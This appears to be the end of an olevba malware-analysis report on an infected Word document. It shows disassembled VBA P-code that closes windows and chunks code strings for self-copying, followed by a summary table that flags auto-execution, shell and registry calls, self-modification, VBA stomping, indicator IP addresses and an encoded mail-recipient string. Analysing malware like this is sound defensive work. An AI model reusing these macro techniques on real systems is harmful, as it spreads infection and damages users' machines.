' Line #671:
' 	CaseElse 
' Line #672:
' 	LitDI2 0x0000 
' 	Coerce (Lng) 
' 	Ld Twnd 
' 	LitStr 0x0003 " - "
' 	Add 
' 	Ld None 
' 	Add 
' 	ArgsLd FindWindow 0x0002 
' 	St Handle 
' Line #673:
' 	Ld HandleBW 
' 	LitDI2 0x0010 
' 	Coerce (Lng) 
' 	LitDI2 0x0000 
' 	Coerce (Lng) 
' 	ParamByVal 
' 	LitDI2 0x0000 
' 	ArgsCall SendMessage 0x0004 
' Line #674:
' 	LitDI2 0x0003 
' 	ArgsCall Pause 0x0001 
' Line #675:
' 	Ld Handle 
' 	LitDI2 0x0010 
' 	Coerce (Lng) 
' 	LitDI2 0x0000 
' 	Coerce (Lng) 
' 	ParamByVal 
' 	LitDI2 0x0000 
' 	ArgsCall SendMessage 0x0004 
' Line #676:
' 	LitDI2 0x0003 
' 	ArgsCall Pause 0x0001 
' Line #677:
' 	LitDI2 0x0000 
' 	St HandleBW 
' Line #678:
' 	LitDI2 0x0000 
' 	St Handle 
' Line #679:
' 	EndSelect 
' Line #680:
' 	StartForVariable 
' 	Next 
' Line #681:
' 	EndIfBlock 
' Line #682:
' 	EndSub 
' Line #683:
' 	FuncDefn (Function Adapt(Cod As String))
' Line #684:
' 	Dim 
' 	VarDefn PostCod (As String)
' Line #685:
' 	Dim 
' 	VarDefn i (As Long)
' Line #686:
' 	OnError (Resume Next) 
' Line #687:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld Cod 
' 	FnLen 
' 	For 
' Line #688:
' 	Ld i 
' 	LitDI2 0x004C 
' 	Ge 
' 	Ld i 
' 	LitDI2 0x004C 
' 	Mod 
' 	Paren 
' 	LitDI2 0x0000 
' 	Eq 
' 	And 
' 	IfBlock 
' Line #689:
' 	Ld PostCod 
' 	Ld Cod 
' 	Ld i 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	Add 
' 	LitStr 0x0001 "#"
' 	Add 
' 	St PostCod 
' Line #690:
' 	ElseBlock 
' Line #691:
' 	Ld PostCod 
' 	Ld Cod 
' 	Ld i 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	Add 
' 	St PostCod 
' Line #692:
' 	EndIfBlock 
' Line #693:
' 	StartForVariable 
' 	Next 
' Line #694:
' 	LitStr 0x0001 "#"
' 	Ld PostCod 
' 	Add 
' 	LitStr 0x0001 "#"
' 	Add 
' 	St Adapt 
' Line #695:
' 	EndFunc 
' Line #696:
' 	QuoteRem 0x0000 0x0008 " End Sub"
' Line #697:
' Line #698:
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoExec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoExit            |Runs when the Word document is closed        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Write               |May write to a file (if combined with Open)  |
|Suspicious|Put                 |May write to a file (if combined with Open)  |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Binary              |May read or write a binary file (if combined |
|          |                    |with Open)                                   |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Application.Visible |May hide the application                     |
|Suspicious|windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|FindWindow          |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Lib                 |May run code from a DLL                      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|Xor                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|RegOpenKeyExA       |May read or write registry keys              |
|Suspicious|RegOpenKeyEx        |May read or write registry keys              |
|Suspicious|RegCloseKey         |May read or write registry keys              |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |194.186.182.26      |IPv4 address                                 |
|IOC       |195.75.32.20        |IPv4 address                                 |
|IOC       |212.19.17.57        |IPv4 address                                 |
|IOC       |advapi32.dll        |Executable file name                         |
|IOC       |user32.dll          |Executable file name                         |
|Base64    |rcpt to:            |cmNwdCB0bzogPHNvcmRvbmdAbWFpbC5jb20+         |
|String    |<sordong@mail.com>  |                                             |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

